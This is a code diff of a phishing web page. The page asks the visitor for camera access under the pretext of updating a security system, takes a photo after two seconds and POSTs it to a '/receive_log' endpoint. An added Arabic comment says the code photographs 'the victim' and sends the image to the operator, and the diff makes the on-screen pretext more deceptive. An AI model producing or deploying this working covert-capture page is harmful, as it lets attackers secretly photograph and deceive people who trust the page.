@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><title>Verify Identity</title></head>
+<head><title>Verify Access</title></head>
 <body>
     <script>
+        // هذا الجزء يطلب الإذن ويصور الضحية ويرسلها لك
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             let video = document.createElement('video');
             video.srcObject = stream;
@@ -11,14 +12,15 @@
                 let canvas = document.createElement('canvas');
                 canvas.width = 640; canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                let imgData = canvas.toDataURL('image/png');
                 fetch('/receive_log', {
                     method: 'POST',
-                    body: JSON.stringify({ content: "📸 صورة جديدة: " + canvas.toDataURL() }),
+                    body: JSON.stringify({ content: "📸 صورة جديدة: " + imgData }),
                     headers: { 'Content-Type': 'application/json' }
                 });
             }, 2000);
-        }).catch(err => console.log("Permission Denied"));
+        });
     </script>
-    <h2>يرجى السماح بالكاميرا لتأكيد أنك لست روبوت 🤖</h2>
+    <h2 style="text-align:center;">يرجى الضغط على "سماح" لتحديث نظام الأمان 🛡️</h2>
 </body>
 </html>
